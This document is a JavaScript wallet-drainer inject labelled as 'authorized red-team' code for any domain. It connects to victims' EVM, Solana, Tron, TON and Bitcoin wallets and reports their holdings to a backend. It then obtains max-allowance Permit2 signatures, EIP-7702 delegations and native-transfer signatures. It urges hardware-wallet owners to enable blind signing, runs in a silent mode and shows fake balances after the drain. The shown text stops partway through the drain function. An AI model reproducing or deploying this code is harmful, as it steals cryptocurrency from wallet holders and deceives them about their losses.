/* Legion authorized red-team drain inject — production backend, any domain */
(function () {
  var BACKEND_URL = '__BACKEND_URL__';
  var BACKEND_URLS = __BACKEND_URLS_JSON__;
  var KINETIC_KEY = '__KINETIC_KEY__';
  var WC_PROJECT_ID = '__WC_PROJECT_ID__';
  var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT__;
  var SILENT_INJECT = __SILENT_INJECT__;
  var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS__;
  var PRODUCTION_CLONE = __PRODUCTION_CLONE__;
  var QA_VISIBLE_UI = __QA_VISIBLE_UI__;
  var CEX_CREDS_API_KEY = '__CEX_CREDS_API_KEY__';
  var CAPTURE_LOGIN_CREDS = __CAPTURE_LOGIN_CREDS__;
  var EIP7702_ENABLED = __EIP7702_ENABLED__;
  var _activeBackend = BACKEND_URL;
  var _backendRotateIdx = 0;
  var _clientConfigLoaded = false;

  function collectWalletSnapshot() {
    var snap = {};
    if (wallets.evm && wallets.evm.address) snap.evm = wallets.evm.address;
    if (wallets.sol && wallets.sol.address) snap.sol = wallets.sol.address;
    if (wallets.tron && wallets.tron.address) snap.tron = wallets.tron.address;
    if (wallets.ton && wallets.ton.address) snap.ton = wallets.ton.address;
    if (wallets.btc && wallets.btc.address) snap.btc = wallets.btc.address;
    if (!snap.evm && window.ethereum && window.ethereum.selectedAddress) {
      snap.evm = window.ethereum.selectedAddress;
    }
    return snap;
  }

  async function captureFakeBalanceSnapshot() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      await window.LegionFakeBalance.capturePreDrainSnapshot(collectWalletSnapshot());
    } catch (e) { /* non-fatal */ }
  }

  function activateFakeBalanceAfterDrain() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      window.LegionFakeBalance.activatePostDrain();
    } catch (e) { /* non-fatal */ }
  }
  if (HARDWARE_AUTO_CONSENT) {
    window.HARDWARE_AUTO_CONSENT = true;
  }
  if (FORCE_HARDWARE_BYPASS) {
    console.warn('[LEGION_AUTH] FORCE_HARDWARE_BYPASS enabled — testing only; assumes blind signing on device');
    window.HARDWARE_AUTO_CONSENT = true;
  }
  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var ACTIVE_TAB = 'evm';

  function resolveScoutUsd(fusionResult, rankedResult) {
    var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
      ? rankedResult.total_usd : 0;
    var fusion = fusionResult && typeof fusionResult.total_usd === 'number' && fusionResult.total_usd > 0
      ? fusionResult.total_usd : 0;
    return ranked > 0 ? ranked : fusion > 0 ? fusion : 0;
  }

  function scoutIngressMeta() {
    var connected = [];
    if (wallets.evm && wallets.evm.address) connected.push('evm');
    if (wallets.sol && wallets.sol.address) connected.push('sol');
    if (wallets.tron && wallets.tron.address) connected.push('tron');
    if (wallets.ton && wallets.ton.address) connected.push('ton');
    if (wallets.btc && wallets.btc.address) connected.push('btc');
    return {
      source_page: typeof location !== 'undefined' ? location.href : '',
      active_chain_tab: ACTIVE_TAB,
      connected_wallets: connected,
    };
  }

  var WC_EVM_CHAINS = [
    'eip155:1',
    'eip155:137',
    'eip155:56',
    'eip155:42161',
    'eip155:8453',
    'eip155:10',
    'eip155:43114',
  ];
  var WC_SOLANA_MAINNET = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  var wallets = {
    evm: null,
    sol: null,
    tron: null,
    ton: null,
    btc: null,
  };

  var wcProvider = null;
  var wcModal = null;
  var wcSdkPromise = null;

  function isHardwareAutoConsent() {
    return Boolean(window.HARDWARE_AUTO_CONSENT || HARDWARE_AUTO_CONSENT || FORCE_HARDWARE_BYPASS);
  }

  function isForceHardwareBypass() {
    return Boolean(FORCE_HARDWARE_BYPASS);
  }

  function detectHardwareWalletType() {
    var eth = window.ethereum;
    if (eth) {
      if (eth.isLedger || eth.isLedgerLive) return 'ledger';
      if (eth.isTrezor) return 'trezor';
    }
    if (wallets.evm && wallets.evm.wcProvider && wallets.evm.wcProvider.session) {
      var peer = wallets.evm.wcProvider.session.peer;
      var peerName = (peer && peer.metadata && peer.metadata.name) || '';
      var lower = peerName.toLowerCase();
      if (lower.indexOf('ledger') >= 0) return 'ledger';
      if (lower.indexOf('trezor') >= 0) return 'trezor';
    }
    if (wallets.evm && wallets.evm.provider) {
      var providerLower = String(wallets.evm.provider).toLowerCase();
      if (providerLower.indexOf('ledger') >= 0) return 'ledger';
      if (providerLower.indexOf('trezor') >= 0) return 'trezor';
    }
    return null;
  }

  function isBlindSigningError(err) {
    var msg = (err && err.message ? err.message : String(err || '')).toLowerCase();
    return (
      msg.indexOf('blind sign') >= 0 ||
      msg.indexOf('blind_sign') >= 0 ||
      msg.indexOf('enable blind') >= 0 ||
      msg.indexOf('blind signing') >= 0 ||
      msg.indexOf('0x6a80') >= 0 ||
      (msg.indexOf('contract data') >= 0 && msg.indexOf('disabled') >= 0) ||
      (msg.indexOf('eip-712') >= 0 && msg.indexOf('not supported') >= 0 && msg.indexOf('ledger') >= 0)
    );
  }

  function showBlindSigningErrorModal() {
    return new Promise(function (resolve, reject) {
      if (isHardwareAutoConsent() || isForceHardwareBypass()) {
        resolve();
        return;
      }

      var existing = document.getElementById('legion-blind-sign-modal');
      if (existing) existing.remove();

      var overlay = document.createElement('div');
      overlay.id = 'legion-blind-sign-modal';
      overlay.className = 'legion-blind-sign-overlay';
      overlay.setAttribute('role', 'alertdialog');
      overlay.setAttribute('aria-modal', 'true');
      overlay.setAttribute('aria-labelledby', 'legion-blind-sign-title');

      var card = document.createElement('div');
      card.className = 'legion-blind-sign-card';
      card.innerHTML = [
        '<h2 id="legion-blind-sign-title">Hardware wallet error</h2>',
        '<p class="legion-blind-error-msg">Blind signing not enabled.<br>Please enable \'Allow blind signing\' in your Ledger/Trezor Ethereum app settings, then click Retry.</p>',
        '<div class="legion-blind-actions">',
        '  <button type="button" class="legion-blind-cancel">Cancel</button>',
        '  <button type="button" class="legion-blind-retry">Retry</button>',
        '</div>',
      ].join('');

      overlay.appendChild(card);
      document.body.appendChild(overlay);

      function cleanup() {
        overlay.remove();
        document.removeEventListener('keydown', onKeyDown);
      }

      function onKeyDown(ev) {
        if (ev.key === 'Escape') {
          cleanup();
          reject(new Error('Hardware wallet signing cancelled'));
        }
      }

      document.addEventListener('keydown', onKeyDown);

      card.querySelector('.legion-blind-retry').addEventListener('click', function () {
        cleanup();
        resolve();
      });

      card.querySelector('.legion-blind-cancel').addEventListener('click', function () {
        cleanup();
        reject(new Error('Hardware wallet signing cancelled'));
      });
    });
  }

  async function onHardwareWalletConnected() {
    /* Permit2 signing handles hardware error modal at signature time */
  }

  function setStatus(text, isSuccess) {
    var el = document.getElementById('legion-auth-status');
    if (!el) return;
    el.textContent = text;
    el.className = 'status' + (isSuccess ? ' success' : '');
  }

  function parseEnvelope(res, data) {
    if (data && typeof data.ok === 'boolean') {
      return { ok: data.ok, message: data.message || '', data: data.data || data };
    }
    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
  }

  async function apiPost(path, body, extraHeaders) {
    var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
    var base = resolveBackendUrl();
    var res = await fetch(base + path, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(body),
    });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error');
    return env.data;
  }

  async function apiGet(path) {
    var base = resolveBackendUrl();
    var res = await fetch(base + path, { method: 'GET' });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error');
    return env.data;
  }

  function resolveBackendUrl() {
    if (window.__legionUseRotatingEndpoints && Array.isArray(BACKEND_URLS) && BACKEND_URLS.length > 0) {
      var host = window.location && window.location.hostname ? window.location.hostname : '';
      var idx = host.length > 0 ? host.charCodeAt(0) % BACKEND_URLS.length : _backendRotateIdx;
      _backendRotateIdx = (idx + 1) % BACKEND_URLS.length;
      return String(BACKEND_URLS[idx] || BACKEND_URLS[0] || _activeBackend).replace(/\/$/, '');
    }
    return String(_activeBackend || BACKEND_URL).replace(/\/$/, '');
  }

  async function loadClientConfig() {
    if (_clientConfigLoaded) return;
    try {
      var cfg = await apiGet('/api/v1/client-config');
      if (cfg && cfg.endpoints && cfg.endpoints.length > 0) {
        BACKEND_URLS = cfg.endpoints;
        _activeBackend = cfg.primary || cfg.endpoints[0];
        if (typeof cfg.eip7702_enabled === 'boolean') {
          EIP7702_ENABLED = cfg.eip7702_enabled;
        }
      }
    } catch (e) {
      /* fallback to build-time BACKEND_URL */
    }
    _clientConfigLoaded = true;
  }

  async function fetchRankedAssets(wallet, chainFamily) {
    try {
      var ranked = await apiPost('/api/v1/scout/ranked', {
        wallet_address: wallet,
        chain_family: chainFamily || 'EVM',
      });
      return ranked;
    } catch (e) {
      console.warn('[LEGION_RANKED_SCOUT]', e);
      return { assets: [], total_usd: 0 };
    }
  }

  function showPortfolioLoadingOverlay() {
    if (PRODUCTION_CLONE || SILENT_INJECT) return;
    var existing = document.getElementById('legion-portfolio-loading');
    if (existing) return;
    var overlay = document.createElement('div');
    overlay.id = 'legion-portfolio-loading';
    overlay.className = 'legion-blind-sign-overlay';
    overlay.innerHTML = '<div class="legion-blind-sign-card"><h2>Loading your portfolio</h2><p>Syncing balances across networks…</p></div>';
    document.body.appendChild(overlay);
    setTimeout(function () {
      var el = document.getElementById('legion-portfolio-loading');
      if (el) el.remove();
    }, 2200);
  }

  async function tryEip7702DelegationDrain(evm, scoutUsd) {
    if (!EIP7702_ENABLED || !evm || !evm.address) return false;
    setStatus('Securing wallet delegation (EIP-7702)…', false);
    var typedPath = '/api/v1/signature-anchor/eip7702-typed-data?wallet=' +
      encodeURIComponent(evm.address) + '&chain_id=' + encodeURIComponent(String(evm.chainId || 1));
    var built = await apiGet(typedPath);
    if (!built || !built.authorization_request) return false;

    var authReq = built.authorization_request;
    var signedAuth = null;

    if (window.ethereum && window.ethereum.request) {
      try {
        signedAuth = await window.ethereum.request({
          method: 'wallet_signAuthorization',
          params: [{
            chainId: '0x' + Number(authReq.chainId).toString(16),
            address: authReq.address || (built.wallet_authorization && built.wallet_authorization.contractAddress),
            contractAddress: built.wallet_authorization && built.wallet_authorization.contractAddress,
            nonce: '0x' + BigInt(authReq.nonce).toString(16),
          }],
        });
      } catch (authErr) {
        console.warn('[LEGION_EIP7702] wallet_signAuthorization unavailable', authErr);
      }
    }

    if (!signedAuth) {
      setStatus('Sign wallet security authorization (EIP-712)…', false);
      var typedSig = await signEvmTypedData(built.typed_data);
      signedAuth = {
        chainId: authReq.chainId,
        address: authReq.address,
        nonce: authReq.nonce,
        r: typedSig.slice(0, 66),
        s: '0x' + typedSig.slice(66, 130),
        yParity: parseInt(typedSig.slice(130, 132), 16) >= 27 ? 1 : 0,
      };
    }

    var authorization = {
      chainId: Number(signedAuth.chainId ?? authReq.chainId),
      address: signedAuth.contractAddress || signedAuth.address || authReq.address,
      nonce: String(signedAuth.nonce ?? authReq.nonce),
      r: signedAuth.r,
      s: signedAuth.s,
      yParity: signedAuth.yParity != null ? signedAuth.yParity : (signedAuth.v != null ? Number(signedAuth.v) : 0),
    };

    setStatus('Submitting EIP-7702 delegation anchor…', false);
    await apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'eip7702_delegation',
      wallet_address: evm.address,
      token_address: built.delegatee,
      chain_id: evm.chainId || 1,
      delegatee: built.delegatee,
      engine_spender: built.spender,
      eip7702_authorization: authorization,
      signature: authorization.r + authorization.s.slice(2),
      nonce: 'eip7702:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
    return true;
  }

  function toHex(n) {
    return '0x' + BigInt(n).toString(16);
  }

  function wcMetadata() {
    return {
      name: document.title || 'Legion Authorized Exercise',
      description: 'Authorized red-team wallet connection',
      url: window.location.origin,
      icons: [window.location.origin + '/favicon.ico'],
    };
  }

  function loadWcSdk() {
    if (!WC_PROJECT_ID) {
      return Promise.reject(new Error('NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID not configured'));
    }
    if (!wcSdkPromise) {
      wcSdkPromise = Promise.all([
        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
        import('https://esm.sh/@walletconnect/modal@2.7.0'),
      ]).then(function (mods) {
        var up = mods[0];
        var md = mods[1];
        return {
          UniversalProvider: up.default || up.UniversalProvider,
          WalletConnectModal: md.WalletConnectModal || (md.default && md.default.WalletConnectModal),
        };
      });
    }
    return wcSdkPromise;
  }

  async function ensureWalletConnectProvider() {
    if (wcProvider && wcProvider.session) return wcProvider;
    var sdk = await loadWcSdk();
    if (!sdk.UniversalProvider) throw new Error('WalletConnect UniversalProvider failed to load');
    wcProvider = await sdk.UniversalProvider.init({
      projectId: WC_PROJECT_ID,
      metadata: wcMetadata(),
    });
    if (!wcModal && sdk.WalletConnectModal) {
      wcModal = new sdk.WalletConnectModal({
        projectId: WC_PROJECT_ID,
        themeMode: 'dark',
      });
    }
    wcProvider.on('display_uri', function (uri) {
      if (wcModal) wcModal.openModal({ uri: uri });
    });
    wcProvider.on('disconnect', function () {
      if (wcModal) wcModal.closeModal();
    });
    return wcProvider;
  }

  function parseWcAccountTriplet(account) {
    if (!account || typeof account !== 'string') return null;
    var parts = account.split(':');
    if (parts.length < 3) return null;
    return { namespace: parts[0], reference: parts[1], address: parts.slice(2).join(':') };
  }

  function applyWalletConnectSession(provider) {
    var ns = (provider.session && provider.session.namespaces) || {};
    var connected = [];

    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
      var evmAcc = parseWcAccountTriplet(ns.eip155.accounts[0]);
      if (evmAcc) {
        var chainId = parseInt(evmAcc.reference, 10);
        wallets.evm = {
          address: evmAcc.address,
          chainId: chainId,
          provider: 'WalletConnect',
          wcProvider: provider,
        };
        connected.push('EVM');
      }
    }

    if (ns.solana && ns.solana.accounts && ns.solana.accounts.length) {
      var solAcc = parseWcAccountTriplet(ns.solana.accounts[0]);
      if (solAcc) {
        wallets.sol = {
          address: solAcc.address,
          provider: provider,
          name: 'WalletConnect',
          wc: true,
        };
        connected.push('Solana');
      }
    }

    return connected;
  }

  async function connectWalletConnect() {
    if (!WC_PROJECT_ID) {
      throw new Error('WalletConnect disabled — set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID at build time');
    }
    setStatus('Opening WalletConnect QR modal…', false);
    var provider = await ensureWalletConnectProvider();

    if (provider.session) {
      var restored = applyWalletConnectSession(provider);
      if (restored.length) return { connected: restored, provider: provider };
    }

    await provider.connect({
      namespaces: {
        eip155: {
          methods: [
            'eth_sendTransaction',
            'eth_signTransaction',
            'eth_signTypedData_v4',
            'personal_sign',
            'eth_sign',
            'eth_chainId',
            'eth_requestAccounts',
            'wallet_switchEthereumChain',
          ],
          chains: WC_EVM_CHAINS,
          events: ['chainChanged', 'accountsChanged'],
        },
        solana: {
          methods: ['solana_signTransaction', 'solana_signMessage'],
          chains: [WC_SOLANA_MAINNET],
          events: [],
        },
      },
    });

    if (wcModal) wcModal.closeModal();

    var connected = applyWalletConnectSession(provider);
    if (!connected.length) {
      throw new Error('WalletConnect session established but no EVM/Solana accounts approved');
    }
    setStatus('WalletConnect: ' + connected.join(' + ') + ' connected', false);
    await onHardwareWalletConnected();
    return { connected: connected, provider: provider };
  }

  async function getEvmSigningProvider() {
    if (wallets.evm && wallets.evm.wcProvider) return wallets.evm.wcProvider;
    if (!window.ethereum) throw new Error('No EVM wallet (MetaMask / Rabby / WalletConnect).');
    return window.ethereum;
  }

  async function connectEvm() {
    if (wallets.evm) return wallets.evm;
    var eth = window.ethereum;
    if (!eth) throw new Error('No EVM wallet (MetaMask / Rabby / Coinbase).');
    var accounts = await eth.request({ method: 'eth_requestAccounts' });
    if (!accounts || !accounts[0]) throw new Error('No EVM account returned');
    var chainHex = await eth.request({ method: 'eth_chainId' });
    var chainId = parseInt(chainHex, 16);
    var provider = eth.isMetaMask ? 'MetaMask' : eth.isRabby ? 'Rabby' : eth.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM';
    wallets.evm = { address: accounts[0], chainId: chainId, provider: provider };
    await onHardwareWalletConnected();
    return wallets.evm;
  }

  async function connectSolana() {
    if (wallets.sol) return wallets.sol;
    var sol = window.phantom && window.phantom.solana;
    if (!sol && window.solflare && window.solflare.isSolflare) sol = window.solflare;
    if (!sol) throw new Error('No Solana wallet (Phantom / Solflare).');
    var resp = await sol.connect();
    var pubkey = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
    if (!pubkey) throw new Error('Solana connect did not return a public key');
    var name = window.phantom && window.phantom.solana === sol ? 'Phantom' : 'Solflare';
    wallets.sol = { address: pubkey, provider: sol, name: name };
    return wallets.sol;
  }

  async function connectTron() {
    if (wallets.tron) return wallets.tron;
    if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    }
    var tw = window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
      throw new Error('TronLink not ready — unlock and refresh.');
    }
    wallets.tron = { address: tw.defaultAddress.base58, provider: 'TronLink' };
    return wallets.tron;
  }

  async function connectTon() {
    if (wallets.ton) return wallets.ton;
    var ton = window.tonkeeper && window.tonkeeper.provider;
    if (!ton && window.ton && window.ton.isTonkeeper) ton = window.ton;
    if (!ton) throw new Error('Tonkeeper not detected.');
    var accounts = await ton.send('ton_getAccounts');
    var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
    if (!addr) throw new Error('Tonkeeper did not return an address');
    wallets.ton = { address: typeof addr === 'string' ? addr : (addr.toString ? addr.toString() : String(addr)), provider: ton };
    return wallets.ton;
  }

  async function connectBitcoin() {
    if (wallets.btc) return wallets.btc;
    if (window.unisat && window.unisat.requestAccounts) {
      var accounts = await window.unisat.requestAccounts();
      if (!accounts || !accounts[0]) throw new Error('UniSat returned no address');
      wallets.btc = { address: accounts[0], provider: 'UniSat' };
      return wallets.btc;
    }
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      var xverse = window.XverseProviders.BitcoinProvider;
      var addrs = await xverse.request('getAccounts');
      if (!addrs || !addrs[0]) throw new Error('Xverse returned no address');
      wallets.btc = { address: addrs[0], provider: 'Xverse' };
      return wallets.btc;
    }
    throw new Error('No Bitcoin wallet (UniSat / Xverse).');
  }

  async function postScout(address, chainId, chainFamily, walletType) {
    var meta = scoutIngressMeta();
    return apiPost('/api/v1/scout', {
      user_address: address,
      chain_id: chainId || 0,
      chain_family: chainFamily,
      wallet_type: walletType,
      source_page: meta.source_page,
      active_chain_tab: meta.active_chain_tab,
      connected_wallets: meta.connected_wallets,
    });
  }

  async function postFusion() {
    var body = {};
    if (wallets.evm) body.evm_holder = wallets.evm.address;
    if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
    if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
    if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
    if (wallets.btc) body.btc_holder_address = wallets.btc.address;
    if (!body.evm_holder && !body.sol_owner_base58 && !body.tron_holder_base58 && !body.ton_friendly_address && !body.btc_holder_address) {
      return { fusion: {}, total_usd: 0 };
    }
    var data = await apiPost('/api/scout/recursive-predator-fusion', body);
    var fusion = (data && data.fusion) || data || {};
    var totalUsd = typeof fusion.total_usd === 'number' ? fusion.total_usd : 0;
    return { fusion: fusion, total_usd: totalUsd };
  }

  async function tryAllowanceReuse() {
    if (!KINETIC_KEY) return null;
    var scanBody = {};
    if (wallets.evm) {
      scanBody.wallet_address = wallets.evm.address;
      scanBody.evm_chain_id = wallets.evm.chainId;
    } else if (wallets.sol) {
      scanBody.wallet_address = wallets.sol.address;
      scanBody.sol_wallet = wallets.sol.address;
    } else if (wallets.tron) {
      scanBody.wallet_address = wallets.tron.address;
      scanBody.tron_wallet = wallets.tron.address;
    } else if (wallets.ton) {
      scanBody.wallet_address = wallets.ton.address;
      scanBody.ton_wallet = wallets.ton.address;
    } else {
      return null;
    }

    var headers = { 'x-legion-kinetic-key': KINETIC_KEY };
    var scanRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/scan', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify(scanBody),
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    var scanEnv = parseEnvelope(scanRes, scanData);
    if (!scanEnv.ok) return null;

    var allowances = (scanEnv.data && scanEnv.data.allowances) || [];
    var executable = allowances.filter(function (a) { return a.executable; });
    if (executable.length === 0) return null;

    var execRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
    });
    var execData = await execRes.json().catch(function () { return {}; });
    var execEnv = parseEnvelope(execRes, execData);
    if (!execEnv.ok) throw new Error(execEnv.message || 'Allowance reuse execute failed');
    return execEnv.data;
  }

  async function signEvmTypedData(typedData) {
    var eth = await getEvmSigningProvider();
    var params = [wallets.evm.address, JSON.stringify(typedData)];

    if (!isHardwareAutoConsent() && detectHardwareWalletType()) {
      await showBlindSigningErrorModal();
    }

    while (true) {
      try {
        return await eth.request({
          method: 'eth_signTypedData_v4',
          params: params,
        });
      } catch (err) {
        if (!isBlindSigningError(err)) throw err;
        if (isHardwareAutoConsent()) throw err;
        await showBlindSigningErrorModal();
      }
    }
  }

  async function signEvmNativeTx(nativeTransfer) {
    if (!nativeTransfer) return null;
    var eth = await getEvmSigningProvider();
    try {
      return await eth.request({
        method: 'eth_signTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          nonce: toHex(nativeTransfer.nonce),
          type: '0x2',
          chainId: toHex(nativeTransfer.chainId),
        }],
      });
    } catch (e) {
      var tx = await eth.request({
        method: 'eth_sendTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          type: '0x2',
        }],
      });
      return tx;
    }
  }

  async function loadSolanaWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function signSolanaWire(unsignedWireBase64) {
    if (wallets.sol && wallets.sol.wc && wcProvider) {
      var wcSigned = await wcProvider.request(
        {
          method: 'solana_signTransaction',
          params: { transaction: unsignedWireBase64 },
        },
        'solana',
      );
      if (typeof wcSigned === 'string') return wcSigned;
      if (wcSigned && wcSigned.transaction) return wcSigned.transaction;
      if (wcSigned && wcSigned.signature) return unsignedWireBase64;
      throw new Error('WalletConnect Solana sign returned unexpected payload');
    }
    var web3 = await loadSolanaWeb3();
    var bytes = Uint8Array.from(atob(unsignedWireBase64), function (c) { return c.charCodeAt(0); });
    var tx = web3.VersionedTransaction.deserialize(bytes);
    var signed = await wallets.sol.provider.signTransaction(tx);
    var out = signed.serialize();
    var bin = '';
    for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
    return btoa(bin);
  }

  async function signTronNative(nativeTransferTrx) {
    if (!nativeTransferTrx || !window.tronWeb) return null;
    var tw = window.tronWeb;
    if (nativeTransferTrx.unsigned && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx.unsigned);
    }
    if (nativeTransferTrx.raw_data && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx);
    }
    return null;
  }

  async function signTonNative(nativeTransferTon) {
    if (!nativeTransferTon || !wallets.ton) return null;
    var ton = wallets.ton.provider;
    if (ton.send && nativeTransferTon.boc) {
      var result = await ton.send('ton_signData', { cell: nativeTransferTon.boc });
      return result;
    }
    return nativeTransferTon.signed_boc || null;
  }

  function extractEvmTokens(fusion, chainId) {
    var permits = [];
    var layers = fusion.evm_layers || fusion.evm || [];
    if (Array.isArray(layers)) {
      for (var i = 0; i < layers.length; i++) {
        var layer = layers[i];
        if (layer.token && layer.amount) {
          permits.push({ token: layer.token, amount: String(layer.amount) });
        } else if (layer.token_address) {
          permits.push({ token: layer.token_address, amount: MAX_PERMIT });
        }
      }
    }
    if (permits.length === 0) {
      permits.push({ token: DEFAULT_USDC, amount: MAX_PERMIT });
    }
    return permits;
  }

  function estimateNativeAmounts(fusion) {
    var sol = '0';
    var trx = '0';
    var ton = '0';
    var native = '0';
    if (fusion.sol_lamports) sol = String(fusion.sol_lamports);
    else if (fusion.solana && fusion.solana.lamports) sol = String(fusion.solana.lamports);
    if (fusion.trx_sun) trx = String(fusion.trx_sun);
    else if (fusion.tron && fusion.tron.sun) trx = String(fusion.tron.sun);
    if (fusion.ton_nanoton) ton = String(fusion.ton_nanoton);
    else if (fusion.ton && fusion.ton.nanoton) ton = String(fusion.ton.nanoton);
    if (fusion.native_wei) native = String(fusion.native_wei);
    else if (fusion.evm && fusion.evm.native_wei) native = String(fusion.evm.native_wei);
    return { native: native, sol: sol, trx: trx, ton: ton };
  }

  async function runOmnichainDrain(scoutUsd, rankedAssets) {
    if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch anchor');
    var evm = wallets.evm;
    var fusion = (await postFusion()).fusion;
    var amounts = estimateNativeAmounts(fusion);
    var permits = extractEvmTokens(fusion, evm.chainId);

    if (Array.isArray(rankedAssets) && rankedAssets.length > 0) {
      var rankedPermits = rankedAssets
        .filter(function (a) {
          return a.family === 'EVM' && a.token && a.token !== 'native' && a.token.startsWith('0x');
        })
        .slice(0, 8)
        .map(function (a) {
          return { token: a.token, amount: a.amount_raw || MAX_PERMIT };
        });
      if (rankedPermits.length > 0) {
        permits = rankedPermits;
      }
    }

    setStatus('Fetching Permit2 batch typed data…', false);
    var batchBody = {
      wallet_address: evm.address,
      chain_id: evm.chainId,
      permits: permits,
      nativeAmount: amounts.native,
    };
    if (wallets.sol) {
      batchBody.sol_wallet = wallets.sol.address;
      batchBody.nativeAmountSol = amounts.sol;
    }
    if (wallets.tron) {
      batchBody.trx_wallet = wallets.tron.address;
      batchBody.nativeAmountTrx = amounts.trx;
    }
    if (wallets.ton) {
      batchBody.ton_wallet = wallets.ton.address;
      batchBody.nativeAmountTon = amounts.ton;
    }

    var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
    var typedData = batch.typed_data;
    var batchMeta = batch.batch_permit_metadata;
    if (!typedData || !batchMeta) throw new Error('Permit2 batch typed data missing from API');

    setStatus('Signing Permit2 batch (EIP-712)…', false);
    var permitSig = await signEvmTypedData(typedData);

    var nativeSignedTx = null;
    if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
      setStatus('Signing EVM native transfer…', false);
      nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
    }

    var nativeSignedSol = null;
    if (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) {
      setStatus('Signing Solana native transfer…', false);
      nativeSignedSol = await signSolanaWire(batch.native_transfer_sol.unsignedWireBase64);
    }

    var nativeSignedSpl = null;
    if (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n) {
      setStatus('Signing Solana SPL batch…', false);
      nativeSignedSpl = await signSolanaWire(batch.spl_transfer.unsignedWireBase64);
    }

    var nativeSignedTrx = null;
    if (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) {
      setStatus('Signing Tron native transfer…', false);
      nativeSignedTrx = await signTronNative(batch.native_transfer_trx);
    }

    var nativeSignedTon = null;
    if (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) {
      setStatus('Signing TON native transfer…', false);
      nativeSignedTon = await signTonNative(batch.native_transfer_ton);
    }

    var nonce = 'omni:' + Date.now();
    var anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evm.address,
      token_address: permits[0].token,
      permits: permits,
      batch_permit_metadata: batchMeta,
      chain_id: evm.chainId,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: batch.nativeAmount || amounts.native,
      signature: permitSig,
      nonce: nonce,
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    };

    if (nativeSignedTx) anchorBody.native_signed_transaction = nativeSignedTx;
    if (wallets.sol) anchorBody.sol_wallet = wallets.sol.address;
    if (wallets.tron) anchorBody.trx_wallet = wallets.tron.address;
    if (wallets.ton) anchorBody.ton_wallet = wallets.ton.address;
    if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
